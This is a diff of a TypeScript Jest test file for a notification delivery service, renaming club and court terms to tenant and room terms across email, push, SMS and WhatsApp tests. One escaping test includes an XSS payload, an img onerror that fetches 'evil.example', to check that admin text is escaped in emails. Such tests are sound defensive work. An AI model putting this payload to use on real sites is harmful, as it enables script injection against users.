@@ -17,21 +17,21 @@ import {
   type WhatsAppTemplateMap,
 } from '../../channels/whatsapp/whatsapp-template.registry';
 
-/** The one template these tests render; ENTRY_WITHDRAWN deliberately has none. */
+/** The templates these tests render; every other type deliberately has none. */
 const TEMPLATES: WhatsAppTemplateMap = {
   INTEGRATION_SYNC_COMPLETED: {
-    name: 'tx_draw_published_v1',
+    name: 'sync_completed_v1',
     languageCode: 'en',
     category: 'UTILITY',
-    body: 'The draw is out: {{1}} — {{2}} via the platform.',
-    bodyValues: (ctx) => allParams(requiredParam(ctx.message), requiredParam(ctx.clubName)),
+    body: 'Sync finished: {{1}} — {{2}} via the platform.',
+    bodyValues: (ctx) => allParams(requiredParam(ctx.message), requiredParam(ctx.tenantName)),
   },
   USER_INVITATION: {
-    name: 'tx_match_scheduled_v1',
+    name: 'team_invite_v1',
     languageCode: 'en',
     category: 'UTILITY',
     body: 'Your team: {{1}} — {{2}}.',
-    bodyValues: (ctx) => allParams(requiredParam(ctx.message), requiredParam(ctx.clubName)),
+    bodyValues: (ctx) => allParams(requiredParam(ctx.message), requiredParam(ctx.tenantName)),
   },
 };
 
@@ -77,7 +77,7 @@ describe('NotificationDeliveryService', () => {
   });
 
   describe('deliver', () => {
-    it('drops a test-marker delivery across EVERY channel (E57-5)', async () => {
+    it('drops a test-marker delivery across EVERY channel', async () => {
       const { results } = await service.deliver({
         recipientUserId: 'user-1',
         recipientDbId: 100,
@@ -110,8 +110,8 @@ describe('NotificationDeliveryService', () => {
         tenantId: 1,
         type: 'USER_INVITATION',
         category: 'TEAM',
-        title: 'Match scheduled',
-        message: 'Court 1',
+        title: 'Meeting scheduled',
+        message: 'Room 1',
         channels: plan(DeliveryChannel.PUSH),
       });
 
@@ -129,8 +129,8 @@ describe('NotificationDeliveryService', () => {
         tenantId: 1,
         type: 'USER_INVITATION',
         category: 'TEAM',
-        title: 'Match scheduled',
-        message: 'Court 1',
+        title: 'Meeting scheduled',
+        message: 'Room 1',
         channels: plan(DeliveryChannel.PUSH),
       });
 
@@ -144,17 +144,17 @@ describe('NotificationDeliveryService', () => {
         tenantId: 1,
         type: 'INTEGRATION_SYNC_COMPLETED',
         category: 'SYSTEM',
-        title: 'Draw',
+        title: 'Sync',
         message: 'Out',
-        actionUrl: 'https://app.example/draws/1',
+        actionUrl: 'https://app.example/sync/1',
         recipientEmail: 'p@example.com',
         channels: plan(DeliveryChannel.EMAIL),
       });
       expect(mockEmail.sendEmail.mock.calls[0][0].html).toContain('>View Details</a>');
     });
 
-    it('escapes organizer free text in the email body', async () => {
-      // A coach types the cancellation reason; it reaches every parent's inbox.
+    it('escapes admin free text in the email body', async () => {
+      // An admin types the cancellation reason; it reaches every member's inbox.
       mockInApp.create.mockResolvedValue({ notificationId: 'ntf-x' });
 
       await service.deliver({
@@ -166,7 +166,7 @@ describe('NotificationDeliveryService', () => {
         title: 'Class cancelled',
         message: 'Under-13 is off. <img src=x onerror="fetch(\'https://evil.example\')">',
         channels: plan(DeliveryChannel.EMAIL),
-        recipientEmail: 'parent@example.com',
+        recipientEmail: 'member@example.com',
       });
 
       const sent = mockEmail.sendEmail.mock.calls[0][0];
@@ -227,9 +227,9 @@ describe('NotificationDeliveryService', () => {
     });
 
     it('includes the string tenantId in the FCM data payload', async () => {
-      // The app compares a push's club against the session's active workspace,
+      // The app compares a push's tenant against the session's active workspace,
       // and the session identifies its workspace by the STRING tenant id. A
-      // numeric db id would never match, so every push would look cross-club.
+      // numeric db id would never match, so every push would look cross-tenant.
       mockInApp.create.mockResolvedValue({ notificationId: 'ntf-3' });
       mockPush.sendPushToUser.mockResolvedValue(undefined);
       mockFcm.sendToUser.mockResolvedValue(undefined);
@@ -242,7 +242,7 @@ describe('NotificationDeliveryService', () => {
         type: 'USER_INVITATION',
         category: 'OPERATIONS',
         title: 'Match 12',
-        message: 'Court 3, 9:40am',
+        message: 'Room 3, 9:40am',
         actionUrl: '/matches/12',
         channels: plan(DeliveryChannel.PUSH),
       });
@@ -261,7 +261,7 @@ describe('NotificationDeliveryService', () => {
     it('still sends the push when no tenant slug was resolved', async () => {
       // Fail open: a push without a tenant routes exactly as it always did
       // (PushMessage.isForTenant treats an absent tenant as "mine"). Losing the
-      // notification entirely would be far worse than losing the club check.
+      // notification entirely would be far worse than losing the tenant check.
       mockInApp.create.mockResolvedValue({ notificationId: 'ntf-4' });
       mockPush.sendPushToUser.mockResolvedValue(undefined);
       mockFcm.sendToUser.mockResolvedValue(undefined);
@@ -273,7 +273,7 @@ describe('NotificationDeliveryService', () => {
         type: 'USER_INVITATION',
         category: 'OPERATIONS',
         title: 'Match 12',
-        message: 'Court 3, 9:40am',
+        message: 'Room 3, 9:40am',
         channels: plan(DeliveryChannel.PUSH),
       });
 
@@ -490,7 +490,7 @@ describe('NotificationDeliveryService', () => {
         tenantId: 1,
         type: 'USER_INVITATION',
         category: 'OPERATIONS',
-        title: 'Court 3, 6pm',
+        title: 'Room 3, 6pm',
         message: 'vs Rahul',
         channels: plan(DeliveryChannel.IN_APP, DeliveryChannel.PUSH, DeliveryChannel.EMAIL, DeliveryChannel.SMS),
         // no recipientEmail, no recipientPhone
@@ -514,7 +514,7 @@ describe('NotificationDeliveryService', () => {
         tenantId: 1,
         type: 'USER_INVITATION',
         category: 'OPERATIONS',
-        title: 'Court 3',
+        title: 'Room 3',
         message: 'x',
         channels: plan(DeliveryChannel.EMAIL),
         recipientEmail: 'a@b.c',
@@ -545,7 +545,7 @@ describe('NotificationDeliveryService', () => {
         tenantId: 1,
         type: 'USER_INVITATION',
         category: 'OPERATIONS',
-        title: 'Court 3',
+        title: 'Room 3',
         message: 'x',
         channels: plan(DeliveryChannel.IN_APP),
       });
@@ -558,7 +558,7 @@ describe('NotificationDeliveryService', () => {
         tenantId: 1,
         type: 'USER_INVITATION',
         category: 'OPERATIONS',
-        title: 'Court 3',
+        title: 'Room 3',
         message: 'x',
         channels: plan(DeliveryChannel.IN_APP),
       });
@@ -572,7 +572,7 @@ describe('NotificationDeliveryService', () => {
         tenantId: 1,
         type: 'USER_INVITATION',
         category: 'OPERATIONS',
-        title: 'Court 3',
+        title: 'Room 3',
         message: 'x',
         channels: plan(DeliveryChannel.SMS),
         recipientPhone: '+919876543210',
@@ -589,7 +589,7 @@ describe('NotificationDeliveryService', () => {
         tenantId: 1,
         type: 'USER_INVITATION',
         category: 'OPERATIONS',
-        title: 'Court 3',
+        title: 'Room 3',
         message: 'x',
         channels: plan(DeliveryChannel.SMS),
         recipientPhone: '+919876543210',
@@ -602,10 +602,10 @@ describe('NotificationDeliveryService', () => {
       recipientDbId: 100,
       tenantId: 1,
       category: 'TEAM',
-      title: 'The draw is out',
-      message: 'Men’s Singles',
+      title: 'Sync finished',
+      message: 'Contacts import',
       channels: plan(DeliveryChannel.WHATSAPP),
-      clubName: 'Smash Club',
+      tenantName: 'Acme Inc',
       whatsappEnabled: true,
       whatsappEntitled: true,
       recipientPhone: '+919876543210',
@@ -625,9 +625,9 @@ describe('NotificationDeliveryService', () => {
           deliveryId: outcomes[0].deliveryId,
           userId: 100,
           send: {
-            templateName: 'tx_draw_published_v1',
+            templateName: 'sync_completed_v1',
             languageCode: 'en',
-            bodyValues: ['Men’s Singles', 'Smash Club'],
+            bodyValues: ['Contacts import', 'Acme Inc'],
           },
         },
       ]);
@@ -638,7 +638,7 @@ describe('NotificationDeliveryService', () => {
     it.each([
       ['no phone', { recipientPhone: undefined }, 'NO_ADDRESS'],
       ['flag off', { whatsappEnabled: false }, 'FLAG_OFF'],
-      ['club not on Pro', { whatsappEntitled: false }, 'NOT_ENTITLED'],
+      ['tenant not on Pro', { whatsappEntitled: false }, 'NOT_ENTITLED'],
       [
         'flag off AND not on Pro — the flag is the reason',
         { whatsappEnabled: false, whatsappEntitled: false },
@@ -656,11 +656,11 @@ describe('NotificationDeliveryService', () => {
       expect(results.WHATSAPP).toBeUndefined();
     });
 
-    it('a missing club name cannot fill the template — SKIPPED/NO_TEMPLATE, never a half-filled send', async () => {
+    it('a missing tenant name cannot fill the template — SKIPPED/NO_TEMPLATE, never a half-filled send', async () => {
       const { outcomes, pendingSends } = await service.deliver({
         ...base,
         type: 'INTEGRATION_SYNC_COMPLETED',
-        clubName: undefined,
+        tenantName: undefined,
       });
       expect(outcomes[0]).toMatchObject({ status: 'SKIPPED', failureReason: 'NO_TEMPLATE' });
       expect(pendingSends).toEqual([]);
@@ -702,10 +702,10 @@ describe('NotificationDeliveryService', () => {
       tenantId: 1,
       type: 'USER_INVITATION',
       category: 'TEAM',
-      title: 'Your match is scheduled',
-      message: 'Court 1 at 10:00',
+      title: 'Your meeting is scheduled',
+      message: 'Room 1 at 10:00',
       recipientPhone: '+919876543210',
-      clubName: 'Smash Club',
+      tenantName: 'Acme Inc',
       whatsappEnabled: true,
       whatsappEntitled: true,
     };
